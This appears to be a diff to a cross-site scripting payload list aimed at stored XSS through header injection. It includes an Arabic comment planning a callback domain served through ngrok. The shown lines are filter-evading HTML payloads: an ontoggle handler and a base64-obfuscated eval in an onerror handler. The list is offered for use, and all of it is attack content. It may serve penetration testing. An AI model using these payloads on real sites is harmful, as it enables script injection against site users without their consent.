@@ -1,5 +1,5 @@
 # This list we will using with https://malekabuliala.github.io/List-s-me/list_xss_stored_header_injection.txt list becuese we need extracted xss Stored from header
-
+# ملاحظة بخصوص مكان اضافة اليور دومين بتم بس يتم تجهيز الكود البرمجي بالكامل لأخذوا من نجروك
 # 1. حمولة الـ "Event Handlers" (بدون كلمة script)
 <details open ontoggle=confirm(1)>
 <video><source onerror=eval(atob('YWxlcnQoJ1B3bmVkJycp'))>
